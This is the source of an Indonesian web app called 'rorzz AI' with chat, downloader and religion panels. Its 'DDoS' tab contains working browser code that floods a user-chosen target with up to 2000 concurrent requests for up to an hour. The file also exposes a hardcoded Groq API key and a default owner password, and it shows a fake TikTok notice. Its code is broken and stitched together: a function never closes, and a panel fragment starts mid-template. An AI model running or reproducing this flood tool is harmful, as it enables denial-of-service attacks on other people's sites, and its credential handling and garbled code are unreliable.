<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>rorzz AI | gamud</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #000000;
            font-family: 'Inter', sans-serif;
            color: #eef2ff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1rem;
        }
        .glass {
            background: #0a0a0a;
            border-radius: 2rem;
            border: 1px solid rgba(255, 255, 255, 0.08);
            width: 100%;
            max-width: 1400px;
            height: 95vh;
            display: flex;
            flex-direction: column;
            box-shadow: 0 25px 45px rgba(0,0,0,0.8);
            overflow: hidden;
        }
        ::-webkit-scrollbar {
            width: 6px;
            height: 6px;
        }
        ::-webkit-scrollbar-track {
            background: #1a1a1a;
            border-radius: 10px;
        }
        ::-webkit-scrollbar-thumb {
            background: #444;
            border-radius: 10px;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: #ff4d4d;
        }
        .auth-container {
            max-width: 400px;
            margin: auto;
            padding: 2rem 1.5rem;
            text-align: center;
        }
        .auth-container h2 {
            margin-bottom: 1.5rem;
            color: #dddddd;
        }
        .auth-container input {
            width: 100%;
            padding: 0.9rem;
            margin: 0.7rem 0;
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 60px;
            color: white;
            font-size: 1rem;
            transition: 0.2s;
        }
        .auth-container input:focus {
            outline: none;
            border-color: #ff4d4d;
            box-shadow: 0 0 5px rgba(255,77,77,0.3);
        }
        .auth-container button {
            width: 100%;
            padding: 0.9rem;
            margin-top: 0.5rem;
            background: #2c2c2c;
            border: none;
            border-radius: 60px;
            font-weight: 600;
            color: white;
            cursor: pointer;
            transition: 0.2s;
        }
        .auth-container button:hover {
            background: #3c3c3c;
        }
        .toggle-link {
            margin-top: 1rem;
            font-size: 0.85rem;
            color: #aaa;
            cursor: pointer;
        }
        .error-msg {
            color: #ff8888;
            font-size: 0.8rem;
            margin-top: 0.5rem;
        }
        .app {
            display: flex;
            flex-direction: column;
            height: 100%;
            width: 100%;
            overflow: hidden;
        }
        .header {
            background: #050505;
            padding: 0.8rem 1.5rem;
            border-bottom: 1px solid #222;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 0.5rem;
            flex-shrink: 0;
        }
        .logo h1 {
            font-size: 1.5rem;
            font-weight: 800;
            background: linear-gradient(135deg, #fff, #aaa);
            background-clip: text;
            -webkit-background-clip: text;
            color: transparent;
        }
        .logo p {
            font-size: 0.65rem;
            color: #888;
        }
        .user-info {
            display: flex;
            gap: 0.5rem;
            align-items: center;
            flex-wrap: wrap;
        }
        .user-info span {
            background: #1f1f1f;
            padding: 0.2rem 0.6rem;
            border-radius: 60px;
            font-size: 0.7rem;
        }
        .logout-btn {
            background: #2c2c2c;
            padding: 0.2rem 0.8rem;
            border-radius: 60px;
            font-size: 0.8rem;
            cursor: pointer;
        }
        .tabs {
            display: flex;
            background: #0f0f0f;
            border-bottom: 1px solid #222;
            padding: 0 0.5rem;
            overflow-x: auto;
            white-space: nowrap;
            scrollbar-width: thin;
            flex-shrink: 0;
        }
        .tab-btn {
            background: transparent;
            border: none;
            padding: 0.7rem 1rem;
            font-size: 0.85rem;
            font-weight: 600;
            color: #aaa;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            border-bottom: 2px solid transparent;
            flex-shrink: 0;
            transition: all 0.2s;
        }
        .tab-btn.active {
            color: white;
            border-bottom-color: #ff4d4d;
            text-shadow: 0 0 2px rgba(255,77,77,0.5);
        }
        .tab-content {
            display: none;
            flex: 1;
            overflow-y: auto;
            padding: 1rem;
        }
        .tab-content.active {
            display: block;
        }
        /* Chat area */
        .chat-container {
            background: #0a0a0a;
            border-radius: 1.5rem;
            height: 60vh;
            min-height: 400px;
            overflow-y: auto;
            padding: 1rem;
            display: flex;
            flex-direction: column;
            gap: 1rem;
            scroll-behavior: smooth;
        }
        .message {
            display: flex;
            gap: 0.8rem;
            max-width: 85%;
        }
        .message.user {
            align-self: flex-end;
            flex-direction: row-reverse;
        }
        .message.ai {
            align-self: flex-start;
        }
        .avatar {
            width: 38px;
            height: 38px;
            border-radius: 50%;
            background: #2c2c2c;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 1rem;
            flex-shrink: 0;
        }
        .user .avatar {
            background: #3a3a3a;
        }
        .bubble {
            background: #1a1a1a;
            padding: 0.8rem 1rem;
            border-radius: 1.2rem;
            font-size: 0.9rem;
            position: relative;
            word-break: break-word;
            max-width: 100%;
        }
        .bubble pre {
            background: #0c0c0c;
            padding: 0.8rem;
            border-radius: 12px;
            overflow-x: auto;
            margin: 0.6rem 0;
            position: relative;
            font-size: 0.75rem;
        }
        .copy-btn {
            position: absolute;
            top: 8px;
            right: 8px;
            background: #2c2c2c;
            border: none;
            color: white;
            font-size: 0.7rem;
            padding: 4px 10px;
            border-radius: 40px;
            cursor: pointer;
            opacity: 1;
            transition: 0.2s;
            font-family: monospace;
            font-weight: 500;
        }
        .copy-btn:hover {
            background: #ff4d4d;
        }
        .input-area {
            display: flex;
            gap: 0.6rem;
            margin-top: 1rem;
        }
        .input-area input {
            flex: 1;
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 60px;
            padding: 0.8rem 1rem;
            color: white;
            font-size: 0.9rem;
            transition: 0.2s;
        }
        .input-area input:focus {
            outline: none;
            border-color: #ff4d4d;
            box-shadow: 0 0 8px rgba(255,77,77,0.3);
        }
        button {
            background: #2c2c2c;
            border: none;
            border-radius: 60px;
            padding: 0.6rem 1rem;
            font-weight: 600;
            color: white;
            cursor: pointer;
            transition: 0.2s;
        }
        button:active {
            transform: scale(0.97);
        }
        button:hover {
            background: #3a3a3a;
        }
        /* Panels */
        .ddos-panel, .downloader-panel, .embed-panel, .religion-panel, .stats-panel {
            background: #0f0f0f;
            border-radius: 1.5rem;
            padding: 1.2rem;
            margin-bottom: 1.2rem;
            border: 1px solid #222;
        }
        .stats-grid-dash {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
            gap: 1rem;
            margin: 1rem 0;
        }
        .stat-card-dash {
            background: #111;
            border-radius: 1rem;
            padding: 1rem;
            text-align: center;
            border: 1px solid #2c2c2c;
        }
        .stat-number {
            font-size: 2rem;
            font-weight: 800;
            color: #ff4d4d;
        }
        .form-group {
            margin-bottom: 1rem;
        }
        label {
            font-size: 0.85rem;
            font-weight: 500;
            color: #ccc;
            display: block;
            margin-bottom: 0.4rem;
        }
        input, select {
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 40px;
            padding: 0.7rem 1rem;
            color: white;
            font-size: 0.9rem;
            width: 100%;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
            gap: 0.8rem;
            background: #0c0c0c;
            border-radius: 1rem;
            padding: 0.8rem;
            margin: 0.8rem 0;
            text-align: center;
        }
        .stat-value {
            font-size: 1.5rem;
            font-weight: 800;
            color: #ff4d4d;
        }
        .log-box, .result-box {
            background: #0a0a0a;
            border-radius: 1rem;
            padding: 0.6rem;
            font-family: monospace;
            font-size: 0.7rem;
            margin-top: 0.8rem;
            max-height: 200px;
            overflow-y: auto;
        }
        .embed-frame {
            width: 100%;
            min-height: 400px;
            border: none;
            border-radius: 1rem;
            margin-top: 1rem;
        }
        .download-link {
            display: inline-block;
            margin-top: 0.8rem;
            background: #2c2c2c;
            padding: 0.4rem 1rem;
            border-radius: 60px;
            text-decoration: none;
            color: white;
            font-weight: bold;
            font-size: 0.8rem;
        }
        footer {
            text-align: center;
            padding: 0.6rem;
            font-size: 0.65rem;
            color: #666;
            border-top: 1px solid #222;
            flex-shrink: 0;
        }
        .modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            backdrop-filter: blur(5px);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }
        .modal-content {
            background: #111;
            border-radius: 2rem;
            max-width: 400px;
            width: 90%;
            padding: 2rem;
            text-align: center;
            border: 1px solid #333;
        }
        @media (max-width: 600px) {
            body { padding: 0.5rem; }
            .glass { border-radius: 1.5rem; height: 98vh; }
            .header { padding: 0.6rem 1rem; }
            .logo h1 { font-size: 1.2rem; }
            .tab-btn { padding: 0.5rem 0.8rem; font-size: 0.75rem; }
            .chat-container { height: 50vh; }
            .friend-card, .user-card { min-width: 100%; }
            .stats-grid { grid-template-columns: 1fr; }
            .embed-frame { min-height: 300px; }
            .message { max-width: 95%; }
            .stats-grid-dash { grid-template-columns: 1fr; }
        }
        .friends-grid, .pending-grid, .users-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
            gap: 1rem;
            margin: 1rem 0;
        }
        .friend-card, .pending-card, .user-card {
            background: #111;
            border-radius: 1.2rem;
            padding: 0.8rem;
            border: 1px solid #222;
        }
        .friend-card.bestie {
            border-color: #ff4d4d;
            background: rgba(255,77,77,0.1);
        }
        .role-badge {
            display: inline-block;
            font-size: 0.65rem;
            background: #2c2c2c;
            padding: 0.2rem 0.5rem;
            border-radius: 60px;
            margin-top: 0.4rem;
        }
        button.small {
            padding: 0.3rem 0.6rem;
            font-size: 0.7rem;
            margin-top: 0.4rem;
            margin-right: 0.3rem;
        }
        /* Typing indicator */
        .typing-indicator {
            display: flex;
            gap: 4px;
            align-items: center;
            background: #1a1a1a;
            padding: 0.6rem 1rem;
            border-radius: 1.2rem;
            width: fit-content;
        }
        .typing-indicator span {
            width: 8px;
            height: 8px;
            background: #aaa;
            border-radius: 50%;
            animation: typing 1s infinite ease-in-out;
        }
        .typing-indicator span:nth-child(1) { animation-delay: 0s; }
        .typing-indicator span:nth-child(2) { animation-delay: 0.2s; }
        .typing-indicator span:nth-child(3) { animation-delay: 0.4s; }
        @keyframes typing {
            0%, 60%, 100% { transform: translateY(0); opacity: 0.4; }
            30% { transform: translateY(-6px); opacity: 1; }
        }
        .input-area input:focus {
            animation: pulseGlow 0.8s ease;
        }
        @keyframes pulseGlow {
            0% { box-shadow: 0 0 0 0 rgba(255,77,77,0.4); }
            70% { box-shadow: 0 0 0 8px rgba(255,77,77,0); }
            100% { box-shadow: 0 0 0 0 rgba(255,77,77,0); }
        }
        /* Better code block copy button always visible */
        .bubble pre {
            position: relative;
        }
        .copy-btn {
            position: absolute;
            top: 8px;
            right: 8px;
            background: #2c2c2c;
            border: none;
            color: white;
            font-size: 0.7rem;
            padding: 4px 10px;
            border-radius: 40px;
            cursor: pointer;
            opacity: 1;
            transition: 0.2s;
        }
        .copy-btn:hover {
            background: #ff4d4d;
        }
    </style>
</head>
<body>
<div class="glass" id="glassContainer">
    <!-- Auth Section -->
    <div id="authSection" class="auth-container">
        <h2><i class="fas fa-key"></i> rorzz AI Access</h2>
        <div id="authForm">
            <input type="text" id="authUsername" placeholder="Username">
            <input type="password" id="authPassword" placeholder="Password">
            <button id="loginBtn">Login</button>
            <div class="toggle-link" id="showRegister">Belum punya akun? Daftar</div>
            <div id="authError" class="error-msg"></div>
        </div>
        <div id="registerForm" style="display:none;">
            <input type="text" id="regUsername" placeholder="Username">
            <input type="password" id="regPassword" placeholder="Password">
            <button id="registerBtn">Daftar (minta persetujuan admin)</button>
            <div class="toggle-link" id="showLogin">Sudah punya akun? Login</div>
            <div id="regError" class="error-msg"></div>
        </div>
    </div>

    <!-- Main App -->
    <div id="mainApp" class="app" style="display:none;">
        <div class="header">
            <div class="logo">
                <h1>⚡ rorzz AI</h1>
                <p>by Deska4you | capek kasi pap imut dlu</p>
            </div>
            <div class="user-info">
                <span id="currentUserRole"></span>
                <span id="currentUserName"></span>
                <div class="logout-btn" id="logoutBtn">Logout</div>
            </div>
        </div>
        <div class="tabs" id="tabsContainer"></div>
        <div id="tabContents"></div>
        <footer>© 2025 rorzz AI by Deska4you — Total Black | No Limits</footer>
    </div>
</div>

<script>
    // ======================== GROQ API KEY ========================
    const GROQ_API_KEY = "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";

    // ======================== USER DATABASE ========================
    let users = JSON.parse(localStorage.getItem('rorzz_users')) || [];
    let pendingUsers = JSON.parse(localStorage.getItem('rorzz_pending')) || [];

    if (!users.find(u => u.username === 'Deska4you')) {
        users.push({ username: 'Deska4you', password: 'admin123', role: 'owner', approved: true });
    }
    function saveUsers() { localStorage.setItem('rorzz_users', JSON.stringify(users)); }
    function savePending() { localStorage.setItem('rorzz_pending', JSON.stringify(pendingUsers)); }
    function userExists(username) {
        return users.some(u => u.username === username) || pendingUsers.some(p => p.username === username);
    }
    let currentUser = null;

    // ======================== ONLINE / OFFLINE SIMULATION ========================
    function updateOnlineStatus() {
        const now = Date.now();
        const activeUsers = users.filter(u => u.lastActive && (now - u.lastActive) < 5 * 60 * 1000).length;
        return activeUsers;
    }
    function markUserActive(username) {
        const user = users.find(u => u.username === username);
        if (user) {
            user.lastActive = Date.now();
            saveUsers();
        }
    }
    setInterval(() => {
        if (currentUser) markUserActive(currentUser.username);
    }, 30000);
    // ======================== FRIENDS ========================
    const friendList = [
        { name: 'Meliaw', role: 'Bestie', desc: 'Paling keren, setia, support selalu.' },
        { name: 'Vinzz', role: 'Friend', desc: 'Jagoan, solid, teman sejati.' },
        { name: 'rapka', role: 'Friend', desc: 'Asik, humoris, selalu bikin cair.' },
        { name: 'puqih', role: 'Friend', desc: 'Pinter, santai, low profile keren.' }
    ];

    // ======================== INTRO MODAL ========================
    function showIntroModal(callback) {
        const modal = document.createElement('div');
        modal.className = 'modal';
        modal.innerHTML = `
            <div class="modal-content">
                <i class="fas fa-info-circle" style="font-size: 3rem; color: #ff4d4d; margin-bottom: 1rem;"></i>
                <p style="font-weight: bold;">Dear Users,</p>
                <p>We regret to inform you that we have discontinued operating TikTok in Hong Kong.</p>
                <p>Thank you for the time you have spent with us on the platform and for giving us the opportunity to bring a little bit of joy into your life.</p>
                <p style="font-style: italic;">— The TikTok Team</p>
                <button id="closeIntroBtn">Lanjutkan Registrasi</button>
            </div>
        `;
        document.body.appendChild(modal);
        const closeBtn = modal.querySelector('#closeIntroBtn');
        closeBtn.addEventListener('click', () => {
            modal.remove();
            if (callback) callback();
        });
    }

    const originalShowRegister = document.getElementById('showRegister');
    const newShowRegister = originalShowRegister.cloneNode(true);
    originalShowRegister.parentNode.replaceChild(newShowRegister, originalShowRegister);
    newShowRegister.addEventListener('click', () => {
        showIntroModal(() => {
            document.getElementById('authForm').style.display = 'none';
            document.getElementById('registerForm').style.display = 'block';
        });
    });

    // ======================== AUTH UI ========================
    const authSection = document.getElementById('authSection');
    const mainApp = document.getElementById('mainApp');
    const authFormDiv = document.getElementById('authForm');
    const registerFormDiv = document.getElementById('registerForm');
    const showLoginLink = document.getElementById('showLogin');
    const loginBtn = document.getElementById('loginBtn');
    const registerBtn = document.getElementById('registerBtn');
    const authError = document.getElementById('authError');
    const regError = document.getElementById('regError');

    showLoginLink.addEventListener('click', () => {
        registerFormDiv.style.display = 'none';
        authFormDiv.style.display = 'block';
    });

    loginBtn.addEventListener('click', () => {
        const username = document.getElementById('authUsername').value.trim();
        const password = document.getElementById('authPassword').value;
        const user = users.find(u => u.username === username && u.password === password);
        if (user && user.approved) {
            currentUser = user;
            markUserActive(username);
            authSection.style.display = 'none';
            mainApp.style.display = 'flex';
            loadApp();
        } else {
            authError.innerText = 'Username/password salah atau akun belum disetujui admin.';
        }
    });

    registerBtn.addEventListener('click', () => {
        const username = document.getElementById('regUsername').value.trim();
        const password = document.getElementById('regPassword').value;
        if (!username || !password) {
            regError.innerText = 'Isi username dan password';
            return;
        }
        if (userExists(username)) {
            regError.innerText = 'Username sudah terdaftar atau pending.';
            return;
        }
        pendingUsers.push({ username, password });
        savePending();
        regError.innerText = 'Pendaftaran berhasil! Tunggu persetujuan admin.';
        setTimeout(() => {
            registerFormDiv.style.display = 'none';
            authFormDiv.style.display = 'block';
            regError.innerText = '';
        }, 2000);
    });

    // ======================== MAIN APP ========================
    function loadApp() {
        const tabsContainer = document.getElementById('tabsContainer');
        const tabContents = document.getElementById('tabContents');
        tabsContainer.innerHTML = '';
        tabContents.innerHTML = '';

        let tabs = [
            { id: 'dashboard', label: '<i class="fas fa-chart-line"></i> Dashboard', component: dashboardPanel },
            { id: 'about', label: '<i class="fas fa-info-circle"></i> Tentang', component: aboutPanel },
            { id: 'ai', label: '<i class="fas fa-robot"></i> rorzz AI', component: aiPanel },
            { id: 'ddos', label: '<i class="fas fa-skull-crossbones"></i> DDoS', component: ddosPanel },
            { id: 'tiktok', label: '<i class="fab fa-tiktok"></i> TikTok', component: tiktokPanel },
            { id: 'fb', label: '<i class="fab fa-facebook"></i> FB', component: fbPanel },
            { id: 'ig', label: '<i class="fab fa-instagram"></i> IG', component: igPanel },
            { id: 'spotifydl', label: '<i class="fab fa-spotify"></i> Spotify DL', component: spotifyDownloaderPanel },
            { id: 'youtubedl', label: '<i class="fab fa-youtube"></i> YouTube DL', component: youtubeDownloaderPanel },
            { id: 'islam', label: '<i class="fas fa-mosque"></i> Islam', component: islamPanel },
            { id: 'kristen', label: '<i class="fas fa-church"></i> Kristen', component: kristenPanel }
        ];
        if (currentUser.role === 'admin' || currentUser.role === 'owner') {
            tabs.unshift({ id: 'admin', label: '<i class="fas fa-user-shield"></i> Admin', component: adminPanel });
        }

        let activeTab = 0;
        function renderTab(index) {
            tabContents.innerHTML = '';
            const comp = tabs[index].component();
            tabContents.appendChild(comp);
            document.querySelectorAll('.tab-btn').forEach((btn, i) => {
                if (i === index) btn.classList.add('active');
                else btn.classList.remove('active');
            });
        }

        tabs.forEach((tab, idx) => {
            const btn = document.createElement('button');
            btn.className = 'tab-btn';
            btn.innerHTML = tab.label;
            btn.addEventListener('click', () => {
                activeTab = idx;
                renderTab(activeTab);
            });
            tabsContainer.appendChild(btn);
        });
        renderTab(activeTab);
        document.getElementById('currentUserName').innerText = currentUser.username;

    // ======================== DDOS PANEL ========================
    function ddosPanel() {
        const container = document.createElement('div');
        container.className = 'ddos-panel';
        container.innerHTML = `
            <div class="form-group"><label>🌐 Target URL/IP</label><input type="text" id="ddosUrl" placeholder="https://example.com atau http://ip:port" value="http://localhost"></div>
            <div class="form-group"><label>⚡ Method</label><select id="ddosMethod"><option>GET</option><option>POST</option></select></div>
            <div class="form-group"><label>🔁 Concurrent Requests (max 2000)</label><input type="number" id="ddosThreads" value="300" min="1" max="2000"></div>
            <div class="form-group"><label>⏱️ Durasi (detik)</label><input type="number" id="ddosDuration" value="60" min="5" max="3600"></div>
            <div class="stats-grid">
                <div class="stat-card">📤 Request<div class="stat-value" id="ddosPackets">0</div></div>
                <div class="stat-card">❌ Gagal<div class="stat-value" id="ddosErrors">0</div></div>
                <div class="stat-card">⏳ Sisa<div class="stat-value" id="ddosTime">0s</div></div>
                <div class="stat-card">🔥 Rate<div class="stat-value" id="ddosRate">0</div></div>
            </div>
            <div style="display:flex; gap:12px; margin-bottom:8px;">
                <button id="ddosStart" style="background:#ff4d4d;">💣 MULAI SERANGAN</button>
                <button id="ddosStop">⛔ STOP</button>
            </div>
            <div class="log-box" id="ddosLog">> Panel DDoS siap. Masukkan target dan tekan Mulai.</div>
        `;
        let attackActive = false, stopFlag = false, packetCount = 0, errorCount = 0, endTime = 0, activeReqs = 0, maxConcurrent = 300;
        let intervalTimer = null;
        const urlInput = container.querySelector('#ddosUrl');
        const methodSelect = container.querySelector('#ddosMethod');
        const threadsInput = container.querySelector('#ddosThreads');
        const durationInput = container.querySelector('#ddosDuration');
        const packetsSpan = container.querySelector('#ddosPackets');
        const errorsSpan = container.querySelector('#ddosErrors');
        const timeSpan = container.querySelector('#ddosTime');
        const rateSpan = container.querySelector('#ddosRate');
        const logDiv = container.querySelector('#ddosLog');
        const startBtn = container.querySelector('#ddosStart');
        const stopBtn = container.querySelector('#ddosStop');

        function addLog(msg) {
            const p = document.createElement('div');
            p.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
            logDiv.appendChild(p);
            logDiv.scrollTop = logDiv.scrollHeight;
            if (logDiv.children.length > 50) logDiv.removeChild(logDiv.children[0]);
        }

        async function sendRequest(url, method) {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 3000);
            try {
                const opts = { method, mode: 'no-cors', cache: 'no-cache', signal: controller.signal };
                if (method === 'POST') opts.body = 'x=' + Math.random();
                await fetch(url, opts);
                packetCount++;
            } catch(e) {
                errorCount++;
            } finally {
                clearTimeout(timeoutId);
                activeReqs--;
            }
        }

        async function worker() {
            while (attackActive && !stopFlag && Date.now() < endTime) {
                if (activeReqs < maxConcurrent) {
                    const toLaunch = Math.min(maxConcurrent - activeReqs, 6);
                    for (let i=0; i<toLaunch && attackActive && !stopFlag; i++) {
                        activeReqs++;
                        sendRequest(urlInput.value, methodSelect.value).catch(()=>{});
                    }
                }
                await new Promise(r => setTimeout(r, 1));
            }
        }

        function startAttack() {
            if (attackActive) return addLog('Serangan sudah berjalan.');
            let target = urlInput.value.trim();
            if (!target.startsWith('http')) target = 'http://' + target;
            urlInput.value = target;
            const threads = parseInt(threadsInput.value);
            const duration = parseInt(durationInput.value);
            if (threads < 1 || duration < 1) return addLog('Threads/durasi tidak valid');
            maxConcurrent = Math.min(threads, 2000);
            attackActive = true; stopFlag = false;
            packetCount = 0; errorCount = 0; activeReqs = 0;
            endTime = Date.now() + duration * 1000;
            packetsSpan.innerText = '0'; errorsSpan.innerText = '0';
            addLog(`🚀 Serangan ke ${target} dengan ${maxConcurrent} concurrent selama ${duration} detik.`);
            const workerCount = Math.min(6, navigator.hardwareConcurrency || 4);
            for (let i=0; i<workerCount; i++) worker();
            if (intervalTimer) clearInterval(intervalTimer);
            let lastPackets = 0, lastTime = Date.now();
            intervalTimer = setInterval(() => {
                if (!attackActive || stopFlag) {
                    if (Date.now() >= endTime) stopAttack();
                    return;
                }
                const remaining = Math.max(0, Math.ceil((endTime - Date.now())/1000));
                timeSpan.innerText = remaining + 's';
                packetsSpan.innerText = packetCount;
                errorsSpan.innerText = errorCount;
                const now = Date.now();
                const elapsedSec = (now - lastTime) / 1000;
                if (elapsedSec >= 0.5) {
                    const rate = (packetCount - lastPackets) / elapsedSec;
                    rateSpan.innerText = Math.round(rate);
                    lastPackets = packetCount;
                    lastTime = now;
                }
                if (remaining <= 0) stopAttack();
            }, 200);
        }

        function stopAttack() {
            if (intervalTimer) clearInterval(intervalTimer);
            attackActive = false; stopFlag = true;
            addLog(`🛑 Berhenti. Total request: ${packetCount}, gagal: ${errorCount}`);
            timeSpan.innerText = '0s';
            rateSpan.innerText = '0';
        }

        startBtn.addEventListener('click', startAttack);
        stopBtn.addEventListener('click', () => { if (attackActive) stopAttack(); else addLog('Tidak ada serangan aktif.'); });
        return container;
    }

                <div id="ytDlLink"></div>
            </div>
        `;
        const urlInput = container.querySelector('#ytDlUrl');
        const formatSelect = container.querySelector('#ytFormat');
        const btn = container.querySelector('#ytDlBtn');
        const resultDiv = container.querySelector('#ytDlResult');
        const infoDiv = container.querySelector('#ytDlInfo');
        const linkDiv = container.querySelector('#ytDlLink');

        btn.addEventListener('click', async () => {
            const url = urlInput.value.trim();
            if (!url) return alert('Masukkan link YouTube!');
            btn.disabled = true;
            btn.textContent = '⏳ Memproses...';
            try {
                const apiUrl = `https://api.cobalt.tools/api/json`;
                const resp = await fetch(apiUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ url: url, downloadMode: formatSelect.value === 'mp3' ? 'audio' : 'video', audioFormat: 'mp3' })
                });
                const data = await resp.json();
                if (!data.url) throw new Error('Gagal mengambil link');
                resultDiv.style.display = 'block';
                infoDiv.innerHTML = `<strong>Download siap</strong>`;
                linkDiv.innerHTML = `<a href="${data.url}" download class="download-link" target="_blank"><i class="fas fa-download"></i> Download ${formatSelect.value.toUpperCase()}</a>`;
            } catch (err) {
                alert(`Error: ${err.message}`);
                resultDiv.style.display = 'none';
            } finally {
                btn.disabled = false;
                btn.textContent = '⬇️ Download';
            }
        });
        return container;
    }

    // ======================== ISLAM ========================
    function islamPanel() {
        const container = document.createElement('div');
        container.innerHTML = `
            <div class="religion-panel">
                <h3><i class="fas fa-mosque"></i> Rukun Islam & Informasi</h3>
                <p>1. Syahadat<br>2. Shalat 5 Waktu<br>3. Zakat<br>4. Puasa Ramadhan<br>5. Haji (bagi yang mampu)</p>
            </div>
            <div class="religion-panel">
                <h3>🕋 Jadwal Shalat (Jakarta)</h3>
                <div id="prayerTimes">Memuat jadwal shalat...</div>
            </div>
            <div class="religion-panel">
                <h3>📖 Ayat Al-Qur'an Hari Ini</h3>
                <div id="quranVerse">Memuat ayat...</div>
            </div>
            <div class="religion-panel">
                <h3>📿 Hadits Pilihan</h3>
                <div id="hadith">Memuat hadits...</div>
            </div>
        `;
        fetch('https://api.aladhan.com/v1/timingsByCity?city=Jakarta&country=Indonesia&method=2')
            .then(res => res.json())
            .then(data => {
                const timings = data.data.timings;
                const prayerDiv = container.querySelector('#prayerTimes');
                prayerDiv.innerHTML = `
                    Imsak: ${timings.Imsak}<br>
                    Subuh: ${timings.Fajr}<br>
                    Dzuhur: ${timings.Dhuhr}<br>
                    Ashar: ${timings.Asr}<br>
                    Maghrib: ${timings.Maghrib}<br>
                    Isya: ${timings.Isha}
                `;
            }).catch(() => container.querySelector('#prayerTimes').innerHTML = 'Gagal memuat jadwal.');
        fetch('https://api.alquran.cloud/v1/ayah/random')
            .then(res => res.json())
            .then(data => {
                const verse = data.data;
                container.querySelector('#quranVerse').innerHTML = `${verse.text}<br><small>— Surah ${verse.surah.name} (${verse.surah.number}:${verse.numberInSurah})</small>`;
            }).catch(() => container.querySelector('#quranVerse').innerHTML = 'Gagal memuat ayat.');
        fetch('https://api.hadith.sutanlab.id/books/muslim/random')
            .then(res => res.json())
            .then(data => {
                const hadith = data.data.hadiths[0];
                container.querySelector('#hadith').innerHTML = `${hadith.arab}<br><br>${hadith.id}`;
            }).catch(() => container.querySelector('#hadith').innerHTML = 'Hadits tidak tersedia.');
        return container;
    }
